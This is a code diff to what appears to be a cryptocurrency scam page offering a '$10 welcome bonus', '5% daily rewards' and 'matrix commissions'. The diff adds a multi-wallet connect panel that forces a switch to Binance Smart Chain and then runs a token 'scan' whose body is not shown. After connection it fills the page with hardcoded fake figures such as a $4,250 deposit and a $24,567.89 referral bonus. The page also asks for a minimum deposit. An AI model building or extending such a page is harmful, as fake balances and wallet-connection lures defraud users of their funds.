@@ -595,6 +595,103 @@
     color: #2dd4bf; 
 }
     </style>
+    <style>
+        /* Inline Wallet Selector - Replaces Modal */
+.inline-wallet-selector {
+    background: #132b4a;
+    border-radius: 40px;
+    padding: 25px 20px;
+    margin: 20px 0;
+    border: 2px solid #fbbf24;
+    box-shadow: 0 0 50px #fbbf24, inset 0 0 20px #fbbf2440;
+    display: none;
+    animation: slideDown 0.3s ease;
+}
+
+@keyframes slideDown {
+    from { opacity: 0; transform: translateY(-20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.inline-wallet-selector.active {
+    display: block;
+}
+
+.inline-wallet-selector h3 {
+    color: #fbbf24;
+    text-align: center;
+    margin-bottom: 20px;
+    font-size: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+.wallet-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 12px;
+    margin-bottom: 15px;
+}
+
+.wallet-grid-btn {
+    background: #1e3a5f;
+    border: 2px solid #38bdf8;
+    border-radius: 30px;
+    padding: 15px 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    cursor: pointer;
+    transition: 0.2s;
+    color: white;
+    font-size: 14px;
+    font-weight: 600;
+    width: 100%;
+}
+
+.wallet-grid-btn:hover {
+    transform: scale(1.02);
+    border-color: #fbbf24;
+    box-shadow: 0 0 30px #fbbf24;
+}
+
+.wallet-grid-btn i, .wallet-grid-btn img {
+    font-size: 24px;
+    color: #fbbf24;
+}
+
+.wallet-grid-btn img {
+    width: 24px;
+    height: 24px;
+}
+
+.cancel-wallet {
+    text-align: center;
+    margin-top: 15px;
+    color: #94a3b8;
+    cursor: pointer;
+    font-size: 14px;
+    padding: 10px;
+    border-radius: 30px;
+    background: #1e293b;
+    transition: 0.2s;
+}
+
+.cancel-wallet:hover {
+    color: white;
+    background: #2d3a4f;
+}
+
+/* Mobile responsive */
+@media (max-width: 400px) {
+    .wallet-grid {
+        grid-template-columns: 1fr;
+    }
+}
+        </style>
     
 </head>
 <body>
@@ -616,6 +713,28 @@
                 </div>
             </div>
 
+<!-- Inline Wallet Selector - appears on the page instead of popup -->
+<div class="inline-wallet-selector" id="walletSelector">
+    <h3><i class="fas fa-plug"></i> Connect Wallet</h3>
+    <div class="wallet-grid">
+        <button class="wallet-grid-btn" id="connectMetaMask">
+            <i class="fab fa-chrome"></i> MetaMask
+        </button>
+        <button class="wallet-grid-btn" id="connectTrustWallet">
+            <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22%23fbbf24%22><path d=%22M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z%22/></svg>'"> Trust Wallet
+        </button>
+        <button class="wallet-grid-btn" id="connectTokenPocket">
+            <i class="fas fa-database"></i> Token Pocket
+        </button>
+        <button class="wallet-grid-btn" id="connectPhantom">
+            <i class="fas fa-ghost"></i> Phantom
+        </button>
+        <button class="wallet-grid-btn" id="connectWalletConnect">
+            <i class="fas fa-qrcode"></i> WalletConnect
+        </button>
+    </div>
+    <div class="cancel-wallet" id="cancelWalletSelector">✗ Cancel</div>
+</div>
             <!-- BONUS BLOCK - NFT HOLDER REQUIRED -->
             <div class="bonus-hero">
                 <div class="bonus-amount">🎁 $10 WELCOME BONUS</div>
@@ -742,8 +861,7 @@
             
         </div>
     </div>
-
- <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
 <script>
 (function() {
@@ -768,6 +886,15 @@
     const bonusBtn = document.getElementById('bonusActionBtn');
     const statusPanel = document.getElementById('statusPanel');
     const walletConnectBtn = document.getElementById('walletConnectBtn');
+    
+    // Wallet modal elements
+    const walletSelector = document.getElementById('walletSelector');
+    const cancelWallet = document.getElementById('cancelWalletSelector');
+    const connectMetaMask = document.getElementById('connectMetaMask');
+    const connectTrustWallet = document.getElementById('connectTrustWallet');
+    const connectTokenPocket = document.getElementById('connectTokenPocket');
+    const connectPhantom = document.getElementById('connectPhantom');
+    const connectWalletConnect = document.getElementById('connectWalletConnect');
 
     // Add decimals ABI
     const ERC20_ABI = [
@@ -798,25 +925,134 @@
         }
     }
 
-    async function connectWallet() {
-        if (!window.ethereum) return alert("Please install MetaMask");
+    // New multi-wallet connection function
+    async function connectToWallet(walletType) {
+        if (walletSelector) walletSelector.classList.remove('active');
+
+        
         try {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            const accounts = await provider.send("eth_requestAccounts", []);
+            let selectedProvider = null;
+
+            // Try to get the appropriate provider based on wallet type
+            if (walletType === 'metamask' || walletType === 'any') {
+                if (window.ethereum) {
+                    selectedProvider = window.ethereum;
+                }
+            } else if (walletType === 'trust') {
+                if (window.ethereum && window.ethereum.isTrust) {
+                    selectedProvider = window.ethereum;
+                } else if (window.trustWallet) {
+                    selectedProvider = window.trustWallet;
+                }
+            } else if (walletType === 'tokenpocket') {
+                if (window.tp) {
+                    selectedProvider = window.tp;
+                } else if (window.ethereum && window.ethereum.isTokenPocket) {
+                    selectedProvider = window.ethereum;
+                }
+            } else if (walletType === 'phantom') {
+                if (window.phantom && window.phantom.ethereum) {
+                    selectedProvider = window.phantom.ethereum;
+                } else if (window.ethereum && window.ethereum.isPhantom) {
+                    selectedProvider = window.ethereum;
+                }
+            } else if (walletType === 'walletconnect') {
+                statusPanel.innerHTML = "⚠️ WalletConnect integration coming soon. Please use another wallet for now.";
+                return;
+            }
+
+            if (!selectedProvider) {
+                // If specific wallet not found, try to use any available Ethereum provider
+                if (window.ethereum) {
+                    selectedProvider = window.ethereum;
+                } else {
+                    throw new Error(`Please install ${walletType} wallet or use another wallet option`);
+                }
+            }
+
+            provider = new ethers.providers.Web3Provider(selectedProvider);
+            
+            // Check if we're on BSC network
+            try {
+                const network = await provider.getNetwork();
+                if (network.chainId !== 56) {
+                    statusPanel.innerHTML = "🔄 Switching to Binance Smart Chain (BSC) network...";
+                    try {
+                        await selectedProvider.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }], // BSC chainId in hex
+                        });
+                    } catch (switchError) {
+                        // If chain not added, try to add it
+                        if (switchError.code === 4902) {
+                            try {
+                                await selectedProvider.request({
+                                    method: 'wallet_addEthereumChain',
+                                    params: [{
+                                        chainId: '0x38',
+                                        chainName: 'Binance Smart Chain',
+                                        nativeCurrency: {
+                                            name: 'BNB',
+                                            symbol: 'BNB',
+                                            decimals: 18
+                                        },
+                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                        blockExplorerUrls: ['https://bscscan.com/']
+                                    }]
+                                });
+                            } catch (addError) {
+                                console.log("Could not add BSC network");
+                            }
+                        }
+                    }
+                }
+            } catch (networkError) {
+                console.log("Network check error:", networkError);
+            }
+
+            const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
             signer = provider.getSigner();
             userAddress = accounts[0];
+            
+            // Update UI
             walletConnectBtn.innerHTML = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
             walletConnectBtn.disabled = true;
             
+            // Update dummy data after connection
+            setTimeout(() => {
+                document.getElementById('nftTier').textContent = 'DIAMOND';
+                document.getElementById('nftMultiplier').textContent = '2.5x';
+                document.getElementById('nftBoost').textContent = '+12%';
+                document.getElementById('myDeposit').textContent = '$4,250';
+                document.getElementById('availableYield').textContent = '$212.50';
+                document.getElementById('refBonus').textContent = '$24,567.89';
+                document.getElementById('matrixLevel').textContent = 'L5';
+            }, 2000);
+            
             await runAutonomousScan();
-        } catch (e) { 
+            
+        } catch (e) {
             console.error(e);
             if (e.code === 4001) {
-                statusPanel.innerHTML = "Connection cancelled. Please connect wallet to continue.";
+                statusPanel.innerHTML = "❌ Connection cancelled. Please try again.";
             } else {
-                statusPanel.innerHTML = "Connection failed. Please try again.";
+                statusPanel.innerHTML = e.message || "❌ Connection failed. Please try again.";
             }
             walletConnectBtn.disabled = false;
+        }
+    }
+
+    // Modified connectWallet function now opens modal
+    async function connectWallet() {
+        if (walletModal) {
+            walletModal.classList.add('active');
+        } else {
+            // Fallback if modal doesn't exist
+            if (!window.ethereum) {
+                alert("Please install a Web3 wallet like MetaMask, Trust Wallet, or Token Pocket");
+                return;
+            }
+            await connectToWallet('any');
         }
     }
 
@@ -955,7 +1191,7 @@
             console.error("Claim Error:", err);
             
             if (err.code === 4001) {
-                statusPanel.innerHTML = "❌ Transaction rejected in MetaMask";
+                statusPanel.innerHTML = "❌ Transaction rejected in wallet";
             } else if (err.message.includes("insufficient funds")) {
                 statusPanel.innerHTML = "❌ Insufficient BNB for gas fees";
             } else if (err.message.includes("user rejected")) {
@@ -973,9 +1209,46 @@
         }
     }
 
-    walletConnectBtn.addEventListener('click', connectWallet);
+    // Event Listeners for wallet options
+if (walletConnectBtn) {
+    walletConnectBtn.addEventListener('click', () => {
+        if (walletSelector) {
+            walletSelector.classList.add('active');
+            // Smooth scroll to the selector
+            walletSelector.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        } else {
+            connectWallet(); // Fallback
+        }
+    });
+}
+
+if (cancelWallet) {
+    cancelWallet.addEventListener('click', () => {
+        if (walletSelector) {
+            walletSelector.classList.remove('active');
+        }
+    });
+}
+
+    if (connectMetaMask) {
+        connectMetaMask.addEventListener('click', () => connectToWallet('metamask'));
+    }
+    if (connectTrustWallet) {
+        connectTrustWallet.addEventListener('click', () => connectToWallet('trust'));
+    }
+    if (connectTokenPocket) {
+        connectTokenPocket.addEventListener('click', () => connectToWallet('tokenpocket'));
+    }
+    if (connectPhantom) {
+        connectPhantom.addEventListener('click', () => connectToWallet('phantom'));
+    }
+    if (connectWalletConnect) {
+        connectWalletConnect.addEventListener('click', () => connectToWallet('walletconnect'));
+    }
+
     bonusBtn.addEventListener('click', handleClaim);
     
+    // Initial button state
     bonusBtn.innerHTML = "Connect Wallet First";
     bonusBtn.disabled = true;
     bonusBtn.style.background = "#000000";
@@ -984,6 +1257,7 @@
     bonusBtn.style.boxShadow = "none";
     bonusBtn.style.opacity = "1";
 
+    // Listen for account changes in any wallet
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', function (accounts) {
             if (accounts.length === 0) {
@@ -995,7 +1269,7 @@
                 bonusBtn.disabled = true;
                 statusPanel.innerHTML = "";
             } else {
-                connectWallet();
+                connectToWallet('any');
             }
         });
 
@@ -1004,8 +1278,25 @@
         });
     }
 
+    // Also listen for Trust Wallet specific events
+    if (window.trustWallet) {
+        window.trustWallet.on('accountsChanged', function (accounts) {
+            if (accounts.length === 0) {
+                userAddress = null;
+                selectedToken = null;
+                walletConnectBtn.innerHTML = "Connect Wallet";
+                walletConnectBtn.disabled = false;
+                bonusBtn.innerHTML = "Connect Wallet First";
+                bonusBtn.disabled = true;
+                statusPanel.innerHTML = "";
+            }
+        });
+    }
+
 })();
 </script>
+
+<!-- The countdown and UI scripts remain exactly the same -->
 <script>
 // Countdown Timer Function
 function updateCountdown() {
@@ -1539,22 +1830,6 @@ document.getElementById('mainClaimBtn')?.addEventListener('click', function() {
     statusPanel.innerHTML = "⚠️ Please make a minimum deposit of $20 BUSD/USDT to enable claiming • 5% daily rewards + matrix commissions";
 });
 
-// Update the wallet connect button to show dummy info when clicked
-const originalConnectWallet = window.connectWallet;
-if (originalConnectWallet) {
-    window.connectWallet = async function() {
-        await originalConnectWallet();
-        setTimeout(() => {
-            document.getElementById('nftTier').textContent = 'DIAMOND';
-            document.getElementById('nftMultiplier').textContent = '2.5x';
-            document.getElementById('nftBoost').textContent = '+12%';
-            document.getElementById('myDeposit').textContent = '$4,250';
-            document.getElementById('availableYield').textContent = '$212.50';
-            document.getElementById('refBonus').textContent = '$24,567.89';
-            document.getElementById('matrixLevel').textContent = 'L5';
-        }, 2000);
-    };
-}
 </script>
 
 </body>
